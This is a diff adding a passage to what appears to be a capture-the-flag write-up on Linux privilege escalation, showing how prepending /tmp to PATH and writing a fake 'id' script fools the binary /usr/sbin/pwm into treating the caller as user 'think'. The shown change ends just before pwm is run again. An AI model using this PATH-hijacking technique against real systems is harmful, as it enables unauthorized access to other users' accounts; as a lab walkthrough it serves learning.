@@ -144,4 +144,18 @@ Let's try creating a fake "id" command to trick it into thinking we are a differ
 export PATH=/tmp:$PATH
 echo $PATH
 ```
-Unless the id command is specified with it's full path (in this case /usr/bin/id), it will look in all of the PATH variables 
+Unless the id command is specified with it's full path (in this case /usr/bin/id), it will look in all of the PATH variables first. Now let's create a fake executable /tmp/id that returns id output for think. We can see what that needs to be when running 
+``` bash
+id think
+```
+
+Create the binary using:
+``` bash
+echo '#!/bin/bash' >> /tmp/id
+echo ' echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> /tmp/id
+chmod +x id # don't forget to make it executable!
+```
+
+running `./id` now returns the exact same output as if the user "think" had run id.
+
+Now run /usr/sbin/pwm again:
